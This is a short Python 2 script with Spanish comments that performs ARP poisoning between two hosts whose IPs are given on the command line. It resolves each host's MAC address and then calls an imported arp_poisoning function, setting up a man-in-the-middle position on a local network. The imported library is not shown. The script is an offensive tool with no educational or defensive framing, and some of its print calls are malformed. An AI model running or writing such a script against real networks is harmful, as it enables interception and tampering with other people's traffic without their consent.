from arplib import get_mac, arp_poisoning
import sys

v1_ip = sys.argv[1]
v2_ip = sys.argv[2]

# obtiene la MAC de la ip_1
v1_mac = get_mac(v1_ip)
print v1_ip, v1_mac
if v1_mac:
    print("[*] MAC de ip_1 %s", v1_mac)
else:    
    print("[!] No es posible obtener la mac de %s", v1_ip)
    sys.exit(0)

# obtiene la MAC de la ip_2
v2_mac = get_mac(v2_ip)
print v2_ip, v2_mac
if v2_mac:
    print("[*] MAC de ip_2 %s", v2_mac)
else:    
    print("[!] No es posible obtener la mac de %s", v2_ip)    
    sys.exit(0)

arp_poisoning(v1_ip, v1_mac, v2_ip, v2_mac)    

